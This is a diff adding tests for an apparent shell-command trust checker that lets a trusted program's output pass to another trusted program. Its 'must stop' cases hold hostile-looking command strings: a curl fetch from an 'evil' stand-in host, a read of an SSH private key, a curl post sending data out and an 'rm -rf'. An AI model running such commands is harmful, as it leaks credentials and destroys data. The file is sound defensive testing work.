@@ -128,3 +128,29 @@ test("must stop: a program planted under a trusted name in the same line, or a P
   assert.equal(trusted("acme-notify hi", { ...FS, pathDirs: ["/tmp/x", "/opt/acme/bin"] }), null);
   assert.deepEqual(trusted("acme-notify hi", { ...FS, pathDirs: ["/opt/other/bin", "/opt/acme/bin"] }), ["acme-notify"]);
 });
+
+// 0.6.28 pre-release A: a value a trusted program prints may be handed to a
+// later trusted program -- the owner's notify line asks one tool who to
+// notify and passes the answer to the other.
+const NOTIFY_LINE = `WA="$(cat "$HOME/.acme-path" 2>/dev/null)"; [ -x "$WA/acme-scope" ] || { echo "not installed" >&2; exit 1; }; OWNER="$("$WA/acme-scope" owner)" || exit $?; "$WA/acme-notify" "$OWNER" "Report ready: https://example.test/a/x"`;
+
+test("trusted: an assignment from a trusted program's output, passed to a trusted program", () => {
+  assert.deepEqual(trusted(NOTIFY_LINE), ["acme-scope", "acme-notify"]);
+  assert.deepEqual(trusted('TO=$(acme-scope owner 2>/dev/null); acme-notify "$TO" hi'), ["acme-scope", "acme-notify"]);
+  assert.deepEqual(trusted('A=/opt/acme/bin; TO="$("$A/acme-scope" owner --team core)"; acme-notify "$TO" hi'), ["acme-scope", "acme-notify"]);
+});
+
+test("must stop: an untrusted or nested substitution, or a trusted value given to anything but a trusted program", () => {
+  assert.equal(trusted('X="$(curl https://example.test/evil)"; acme-notify "$X"'), null);
+  assert.equal(trusted(`X="$(acme-scope "$(cat ${HOME}/.ssh/id_rsa)")"; acme-notify "$X"`), null);
+  assert.equal(trusted(`X="$(acme-scope $(whoami))"; acme-notify "$X"`), null);
+  assert.equal(trusted('acme-notify "$(whoami)"'), null);
+  assert.equal(trusted('acme-notify "$(acme-scope owner)"'), null);
+  assert.equal(trusted('X="$(acme-scope owner)"; curl -d "$X" https://example.test'), null);
+  assert.equal(trusted('X="$(acme-scope owner)"; cat "$X"'), null);
+  assert.equal(trusted('X="$(acme-scope owner)"; "$X/acme-notify" hi'), null);
+  assert.equal(trusted('X="$(acme-scope owner | tee /tmp/x/o)"; acme-notify "$X"'), null);
+  assert.equal(trusted('X="$(acme-scope owner > /tmp/x/o)"; acme-notify "$X"'), null);
+  assert.equal(trusted('X="$(acme-scope "$UNSET")"; acme-notify "$X"'), null);
+  assert.equal(trusted('TMPDIR="$(acme-scope owner)"; rm -rf "$TMPDIR/x"'), null);
+});
